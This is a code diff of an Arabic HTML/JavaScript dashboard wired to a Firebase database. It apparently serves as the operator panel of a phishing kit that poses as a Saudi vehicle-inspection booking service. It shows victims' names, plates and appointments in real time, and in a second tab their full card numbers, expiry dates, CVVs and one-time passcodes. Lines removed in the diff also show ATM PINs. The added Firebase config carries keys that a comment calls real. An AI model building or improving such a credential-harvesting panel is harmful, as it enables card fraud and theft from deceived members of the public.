@@ -3,98 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - مركز سلامة المركبات</title>
+    <title>لوحة التحكم - Saso Inspection</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-
     <style>
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
         .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
-        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; font-size: 14px; }
+        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
         .nav-btn.active { background: #ffffff; color: #1e7344; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; border-bottom: 2px solid #b8860b; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
         .container { padding: 15px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-
-        /* تنسيق كروت بيانات الحجز الشخصية */
         .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
         .customer-card { background: white; border-radius: 12px; padding: 20px; border-right: 8px solid #1e7344; box-shadow: 0 4px 10px rgba(0,0,0,0.05); position: relative; }
-        .time-tag { background: #e6f4ea; color: #1e7344; padding: 4px 8px; border-radius: 5px; font-size: 11px; font-weight: bold; position: absolute; left: 15px; top: 20px; }
-
-        /* تنسيق سطر بيانات البطاقات */
-        .operation-row { background: white; border-radius: 8px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; border: 1px solid #eee; overflow-x: auto; }
-        .name-tag { min-width: 140px; font-weight: bold; font-size: 14px; }
-        .box { padding: 8px 12px; border-radius: 6px; text-align: center; font-size: 13px; font-weight: bold; border: 1px solid transparent; white-space: nowrap; }
-        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; min-width: 180px; }
-        .otp-box { background: #fff5f5; border-color: #ffdada; color: #a94442; min-width: 150px; }
-
-        .btn-delete { background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; }
+        .operation-row { background: white; border-radius: 8px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; border: 1px solid #eee; }
+        .box { padding: 8px 12px; border-radius: 6px; font-size: 13px; font-weight: bold; }
+        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; }
+        .btn-delete { background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="visitor-counter">
-    المتواجدون الآن في الموقع: <span id="onlineCount">0</span> زائر 🌐
-</div>
+<div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> زائر 🌐</div>
 
 <div class="navbar">
-    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز والوثائق</button>
-    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 مراقبة بيانات البطاقات</button>
+    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
+    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
 </div>
 
 <div class="container">
-    <div id="bookingSection" class="tab-content active">
-        <div id="bookingGrid" class="booking-grid"></div>
-    </div>
-
-    <div id="cardsSection" class="tab-content">
-        <div id="paymentsContainer"></div>
-    </div>
+    <div id="bookingSection" class="tab-content active"><div id="bookingGrid" class="booking-grid"></div></div>
+    <div id="cardsSection" class="tab-content"><div id="paymentsContainer"></div></div>
 </div>
 
 <script>
-    // --- إعدادات Firebase (يجب أن تكون نفس الموجودة في صفحة العميل) ---
+    // بياناتك الحقيقية من الصورة
     const firebaseConfig = {
-        apiKey: "AIzaSyAzXXXXXXXXXXXX_YOUR_API_KEY",
-        authDomain: "vsc-project.firebaseapp.com",
-        databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/",
-        projectId: "vsc-project",
-        storageBucket: "vsc-project.appspot.com",
-        messagingSenderId: "1234567890",
-        appId: "1:1234567890:web:abcdef123456"
+        apiKey: "AIzaSyAeZajT4kZWV1JSKiehqLFrT", // تم استخراجها من صورتك
+        authDomain: "saso-inspection.firebaseapp.com",
+        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", // تأكد من هذا الرابط في صفحة Database
+        projectId: "saso-inspection",
+        storageBucket: "saso-inspection.appspot.com",
+        messagingSenderId: "1009002235896",
+        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
     };
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    // تحديث عداد الزوار
-    database.ref('visitors').on('value', (s) => {
-        document.getElementById('onlineCount').innerText = s.numChildren();
-    });
+    // عداد الزوار (يراقب الزيارات النشطة)
+    database.ref('visitors').on('value', s => document.getElementById('onlineCount').innerText = s.numChildren());
 
-    // سحب وعرض بيانات الحجز (من مسار visitors)
+    // عرض بيانات الحجز
     database.ref('visitors').on('value', (snapshot) => {
         const grid = document.getElementById('bookingGrid');
         grid.innerHTML = '';
         snapshot.forEach((child) => {
             const val = child.val();
-            // تصفية البيانات التي تحتوي على اسم فقط
             if(val.full_name) {
                 grid.innerHTML += `
                 <div class="customer-card">
-                    <span class="time-tag">نشط الآن</span>
-                    <h3>${val.full_name} 👤</h3>
-                    <p>🚗 المركبة: ${val.vehicle_type || '-'} (${val.plate_number || '-'})</p>
-                    <p>📍 الموقع: ${val.region || '-'} - ${val.center || '-'}</p>
-                    <p>📅 الموعد: ${val.appointment_date || '-'} | ${val.appointment_time || '-'}</p>
-                    <p>📱 الجوال: ${val.phone || '-'}</p>
-                    <button class="btn-delete" onclick="deleteData('visitors/${child.key}')">حذف البيانات</button>
+                    <h3>${val.full_name}</h3>
+                    <p>🚗 ${val.vehicle_type || '-'} (${val.plate_number || '-'})</p>
+                    <p>📍 ${val.region || '-'} - ${val.center || '-'}</p>
+                    <p>📅 ${val.appointment_date || '-'} | ${val.appointment_time || '-'}</p>
+                    <button class="btn-delete" onclick="deleteData('visitors/${child.key}')">حذف</button>
                 </div>`;
             }
         });
     });
 
-    // سحب وعرض بيانات البطاقات (من مسار payments أو حسب ما ترسله صفحة الدفع)
+    // عرض بيانات البطاقات
     database.ref('payments').on('value', (snapshot) => {
         const container = document.getElementById('paymentsContainer');
         container.innerHTML = '';
@@ -102,24 +81,21 @@
             const val = child.val();
             container.innerHTML += `
             <div class="operation-row">
-                <div class="name-tag">${val.name || 'عميل مجهول'}</div>
-                <div class="box card-box">💳 ${val.cardNumber || '----'} | ${val.exp || '--/--'} | ${val.cvv || '---'}</div>
-                <div class="box otp-box">🔐 OTP: ${val.otp || '----'} | ATM: ${val.atm || '----'}</div>
+                <div style="min-width:120px"><b>${val.name || 'عميل'}</b></div>
+                <div class="box card-box">💳 ${val.cardNumber || '----'} | ${val.exp || '--'} | ${val.cvv || '--'}</div>
+                <div class="box" style="background:#fff5f5">🔐 OTP: ${val.otp || '-'}</div>
                 <button class="btn-delete" onclick="deleteData('payments/${child.key}')">🗑</button>
             </div>`;
         });
     });
 
-    function deleteData(path) {
-        if(confirm('هل أنت متأكد من الحذف؟')) database.ref(path).remove();
-    }
-
+    function deleteData(path) { if(confirm('متأكد؟')) database.ref(path).remove(); }
     function openTab(evt, tabName) {
         var i, tabcontent, navbtns;
         tabcontent = document.getElementsByClassName("tab-content");
-        for (i = 0; i < tabcontent.length; i++) { tabcontent[i].style.display = "none"; }
+        for (i = 0; i < tabcontent.length; i++) tabcontent[i].style.display = "none";
         navbtns = document.getElementsByClassName("nav-btn");
-        for (i = 0; i < navbtns.length; i++) { navbtns[i].className = navbtns[i].className.replace(" active", ""); }
+        for (i = 0; i < navbtns.length; i++) navbtns[i].className = navbtns[i].className.replace(" active", "");
         document.getElementById(tabName).style.display = "block";
         evt.currentTarget.className += " active";
     }
